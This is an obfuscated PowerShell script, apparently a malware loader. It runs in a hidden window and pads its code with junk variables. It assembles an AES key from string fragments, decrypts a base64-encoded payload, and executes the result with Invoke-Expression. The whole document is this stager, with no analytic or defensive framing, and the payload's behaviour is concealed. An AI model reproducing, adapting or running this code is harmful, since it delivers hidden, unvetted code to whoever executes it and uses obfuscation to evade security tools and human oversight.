
powershell.exe -WindowStyle Hidden -Command {
    $zXODyBHu = 1341
    $MzXDCjYM = ([Math]::Sqrt($qVQwAuJc) * 15).ToString()
    $WYfboOmy = "d"
    $bAoizNNY = "C"
    $tGTPdehJ = "f"
    $nNwEVNMX = "U"
    $aizVWUWu = "0"
    $kzUXCocM = "k"
    $sLRHXEbs = "p"
    $WWYAeNgO = "v"
    $HqPiVEXU = "Z"
    $DMzvLnyW = "8"
    $ewDupDDs = "y"
    $rTdwzfqy = "M"
    $Zojkaabu = "a"
    $rujXWcsA = "K"
    $XWmlTUJn = "S"
    $PvftNKvB = "S"
    $t1 = 59 + 60
    $t2 = ($t1 * 9) - ($t1 / 8)
    $t3 = "d" + "C" + "f" + "U" + "0"
    $t4 = "k" + "p" + "v" + "Z" + "8"
    $t5 = "y" + "M" + "a" + "K" + "S" + "S"
    $p = $t3 + $t4 + $t5
    $a = [Text.Encoding]::UTF8.GetBytes($p)
    $d = [Convert]::FromBase64String("QWeCb69K5NfIvs2wtr59cVN+2LhY+4AGzUd6R3wLKO7bIq+Qa2R9ckCHJb9glrSE9RGd/g3z+Up4DntNVwnJtnLjvzw+ghAZBQrM+mLKjjFIGeyTuOjJqwFqgzzQb+j9gtZsoCW0wBuYgOdxBYt6p01fpuJIAwX/Z0yaEkjx5NVFI6fjlkyPYNGml79W1lMk4QUKkat9VLNPXF8wb+7it0t4+P97gEFgAgAHI21+kwc=")
    $i = $d[0..15]
    $e = $d[16..($d.Length - 1)]
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Key = $a
    $aes.IV = $i
    $dec = $aes.CreateDecryptor()
    $out = $dec.TransformFinalBlock($e, 0, $e.Length)
    $res = [Text.Encoding]::UTF8.GetString($out)
    Invoke-Expression $res
}
